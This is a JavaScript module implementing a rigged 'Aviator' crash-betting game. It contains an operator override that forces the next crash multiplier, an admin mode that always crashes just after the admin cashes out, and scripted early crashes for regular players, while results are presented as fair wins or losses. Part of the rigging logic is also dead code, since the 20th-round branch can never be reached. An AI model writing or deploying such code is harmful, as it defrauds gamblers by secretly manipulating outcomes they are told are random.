// Rigged Aviator Game Logic
let roundCounter = 0;
let forcedMultiplier = null;

const setForcedMultiplier = (m) => {
    forcedMultiplier = m;
};

const playAviator = (betAmount, cashOutMultiplier, isAdmin = false) => {
    roundCounter++;
    
    let crashMultiplier;

    if (forcedMultiplier !== null) {
        crashMultiplier = Number(forcedMultiplier);
        forcedMultiplier = null; // Use once
    } else if (isAdmin) {
        crashMultiplier = cashOutMultiplier + 0.5; // Always crash after admin cashes out
    } else {
        // Rigged logic for regular users
        if (roundCounter % 10 === 0) {
            crashMultiplier = 1.00; // 1x crash every 10th round
        } else if (roundCounter % 15 === 0) {
            crashMultiplier = 1.50; // 1.5x crash every 15th round
        } else if (roundCounter % 20 === 0) {
            crashMultiplier = Math.random() > 0.5 ? 2.00 : 2.50; // 2x or 2.5x every 20th round
        } else {
            // Normal random crash (mostly low to keep house profit)
            const rand = Math.random();
            if (rand < 0.7) crashMultiplier = 1 + Math.random() * 1.5; // 70% chance low (1-2.5x)
            else crashMultiplier = 1 + Math.random() * 10; // 30% chance higher
        }
    }

    if (roundCounter > 100) roundCounter = 0; // Reset counter

    let result, winAmount;
    if (cashOutMultiplier < crashMultiplier) {
        result = 'WIN';
        winAmount = Math.floor(betAmount * cashOutMultiplier);
    } else {
        result = 'CRASHED';
        winAmount = 0;
    }

    return {
        result,
        betAmount,
        winAmount,
        profit: winAmount - betAmount,
        cashOutAt: cashOutMultiplier.toFixed(2),
        crashedAt: crashMultiplier.toFixed(2),
        message: result === 'WIN' ? "Victory!" : "Crashed!"
    };
};

module.exports = { playAviator, setForcedMultiplier };
